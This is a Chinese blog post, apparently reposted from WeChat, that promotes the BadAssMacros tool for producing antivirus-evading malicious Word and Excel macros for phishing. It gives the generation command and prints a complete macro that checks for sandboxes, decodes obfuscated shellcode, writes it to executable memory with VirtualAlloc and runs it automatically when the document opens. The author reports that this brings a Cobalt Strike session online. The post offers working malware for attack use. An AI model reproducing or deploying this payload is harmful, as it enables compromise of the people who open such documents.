> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qvHt7O1DFjnPiMTrL0LhGQ)

    在众多的攻击方式中，钓鱼文档攻击仍然扮演者重要的地位，而随着各类安全防护设备的成熟，宏免杀一直是我们所讨论的问题，之前有 MacroPack(收费版仍然好用) 可以生成免杀宏文档，但特征已被标记，今天介绍的这款工具则仍然效果很好。  

地址如下：https://github.com/Inf0secRabbit/BadAssMacros

     先来看一下免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XzMvGtkUV65QQVgpV1OSlvRx7CgiamgqSQzjyWdhJMOcibdVEWLlUTiaV6cdVOy4Qejqx6ZeMPicmKog/640?wx_fmt=png)

目前具有的功能如下：

*   Classic VBA shellcode injection.
    
*   Indirect VBA shellcode injection (using LoadLibrary).
    
*   Sandbox Detection.
    
*   VBA Purging.
    
*   Shellcode obfuscation.
    
*   Variable name Randomization.
    

这里我使用第一种方式进行注入  

```
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XzMvGtkUV65QQVgpV1OSlvUOKKHpf9hsFjXKicIFOwkShh2U5GxeI470nLvDh9E5NrH7ibeRpmJdBA/640?wx_fmt=png)

生成的宏代码如下：

```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Function stb()
 Dim qAW As Variant
 Dim GvH As LongPtr
 Dim DTc As Long
 Dim xiB As Long
 Dim fWB As LongPtr
 If Application.RecentFiles.Count < 3 Then
Exit Function
End If
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor", , 48)
For Each objItem In colItems
If objItem.NumberOfCores < 3 Then
Exit Function
End If
Next
 qAW = Array(255, 75, 134, 231, 243, 235, 203, 3, 3, 3, 68, 84, 68, 83, 85, 84, 89, 75, 52, 213, 104, 75, 142, 85, 99, 75, 142, 85, 27, 75, 142, 85, 35, 75, 142, 117, 83, 75, 18, 186, 77, 77, 80, 52, 204, 75, 52, 195, 175, 63, _
100, 127, 5, 47, 35, 68, 196, 204, 16, 68, 4, 196, 229, 240, 85, 68, 84, 75, 142, 85, 35, 142, 69, 63, 75, 4, 211, 105, 132, 123, 27, 14, 5, 120, 117, 142, 131, 139, 3, 3, 3, 75, 136, 195, 119, 106, 75, 4, 211, 83, _
142, 75, 27, 71, 142, 67, 35, 76, 4, 211, 230, 89, 75, 258, 204, 68, 142, 55, 139, 75, 4, 217, 80, 52, 204, 75, 52, 195, 175, 68, 196, 204, 16, 68, 4, 196, 59, 227, 120, 244, 79, 6, 79, 39, 11, 72, 60, 212, 120, 219, _
91, 71, 142, 67, 39, 76, 4, 211, 105, 68, 142, 15, 75, 71, 142, 67, 31, 76, 4, 211, 68, 142, 7, 139, 75, 4, 211, 68, 91, 68, 91, 97, 92, 93, 68, 91, 68, 92, 68, 93, 75, 134, 239, 35, 68, 85, 258, 227, 91, 68, _
92, 93, 75, 142, 21, 236, 82, 258, 258, 258, 96, 109, 3, 76, 193, 122, 108, 113, 108, 113, 104, 119, 3, 68, 89, 76, 140, 233, 79, 140, 244, 68, 189, 79, 122, 41, 10, 258, 216, 75, 52, 204, 75, 52, 213, 80, 52, 195, 80, 52, _
204, 68, 83, 68, 83, 68, 189, 61, 89, 124, 170, 258, 216, 238, 118, 93, 75, 140, 196, 68, 187, 100, 33, 3, 3, 80, 52, 204, 68, 84, 68, 84, 109, 6, 68, 84, 68, 189, 90, 140, 162, 201, 258, 216, 238, 92, 94, 75, 140, 196, _
75, 52, 213, 76, 140, 219, 80, 52, 204, 85, 107, 3, 5, 67, 135, 85, 85, 68, 189, 238, 88, 49, 62, 258, 216, 75, 140, 201, 75, 134, 198, 83, 109, 13, 98, 75, 140, 244, 75, 140, 221, 76, 202, 195, 258, 258, 258, 258, 80, 52, _
204, 85, 85, 68, 189, 48, 9, 27, 126, 258, 216, 136, 195, 18, 136, 160, 4, 3, 3, 75, 258, 210, 18, 135, 143, 4, 3, 3, 238, 214, 236, 231, 4, 3, 3, 235, 165, 258, 258, 258, 50, 68, 107, 105, 81, 3, 157, 152, 102, 60, _
179, 136, 116, 184, 55, 38, 239, 250, 111, 149, 90, 39, 166, 220, 17, 236, 156, 173, 190, 208, 118, 42, 257, 206, 123, 209, 43, 169, 53, 205, 216, 128, 12, 197, 242, 182, 95, 141, 121, 124, 19, 107, 29, 95, 202, 59, 153, 178, 48, 5, _
145, 187, 177, 77, 21, 147, 43, 170, 168, 82, 205, 158, 16, 63, 236, 93, 13, 138, 84, 3, 88, 118, 104, 117, 48, 68, 106, 104, 113, 119, 61, 35, 80, 114, 125, 108, 111, 111, 100, 50, 55, 49, 51, 35, 43, 102, 114, 112, 115, 100, _
119, 108, 101, 111, 104, 62, 35, 80, 86, 76, 72, 35, 59, 49, 51, 62, 35, 90, 108, 113, 103, 114, 122, 118, 35, 81, 87, 35, 56, 49, 52, 62, 35, 87, 117, 108, 103, 104, 113, 119, 50, 55, 49, 51, 44, 16, 13, 3, 214, 193, _
208, 55, 4, 11, 192, 107, 203, 115, 147, 235, 180, 13, 143, 54, 239, 195, 106, 45, 70, 111, 186, 9, 50, 123, 33, 127, 155, 240, 94, 109, 44, 74, 215, 28, 87, 65, 234, 248, 256, 243, 98, 44, 211, 214, 183, 133, 125, 236, 179, 173, _
42, 79, 178, 37, 192, 157, 121, 113, 171, 34, 186, 133, 255, 128, 215, 171, 210, 205, 146, 240, 29, 36, 48, 127, 76, 230, 26, 217, 115, 92, 25, 236, 197, 231, 257, 122, 62, 143, 244, 121, 27, 239, 38, 94, 56, 147, 243, 126, 156, 179, _
56, 182, 70, 237, 65, 27, 97, 239, 200, 197, 202, 174, 144, 34, 151, 62, 49, 60, 202, 52, 98, 40, 250, 185, 239, 199, 73, 221, 9, 190, 126, 256, 79, 55, 29, 250, 163, 143, 71, 209, 165, 146, 197, 110, 170, 166, 230, 200, 159, 3, _
116, 93, 9, 95, 83, 16, 158, 164, 178, 82, 59, 108, 40, 34, 85, 47, 32, 224, 108, 77, 211, 83, 65, 201, 229, 35, 220, 3, 214, 148, 211, 48, 250, 225, 80, 148, 6, 168, 36, 35, 66, 197, 200, 170, 212, 245, 149, 56, 30, 181, _
21, 188, 102, 214, 68, 45, 199, 87, 53, 11, 121, 103, 133, 62, 193, 58, 25, 75, 138, 207, 190, 118, 212, 3, 68, 193, 243, 184, 165, 89, 258, 216, 75, 52, 204, 189, 3, 3, 67, 3, 68, 187, 3, 19, 3, 3, 68, 188, 67, 3, _
3, 3, 68, 189, 91, 167, 86, 232, 258, 216, 75, 150, 86, 86, 75, 140, 234, 75, 140, 244, 75, 140, 221, 68, 187, 3, 35, 3, 3, 76, 140, 252, 68, 189, 21, 153, 140, 229, 258, 216, 75, 134, 199, 35, 136, 195, 119, 185, 105, 142, _
10, 75, 4, 198, 136, 195, 120, 218, 91, 91, 91, 75, 8, 3, 3, 3, 3, 83, 198, 235, 162, 256, 258, 258, 52, 60, 53, 49, 52, 57, 59, 49, 52, 53, 54, 49, 52, 54, 52, 3, 84, 12, 194, 112)
For i = 0 To UBound(qAW)
qAW(i) = qAW(i) - 3
Next i
GvH = VirtualAlloc(0, UBound(qAW), &H3000, &H40)
For DTc = LBound(qAW) To UBound(qAW)
xiB = qAW(DTc)
fWB = RtlMoveMemory(GvH + DTc, xiB, 1)
Next DTc
res = CreateThread(0, 0, GvH, 0, 0, 0)
End Function
Sub Document_Open()
stb
End Sub
Sub AutoOpen()
stb
End Sub
```

运行后，CS 上线，有兴趣的可以自己去翻一翻源码。

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)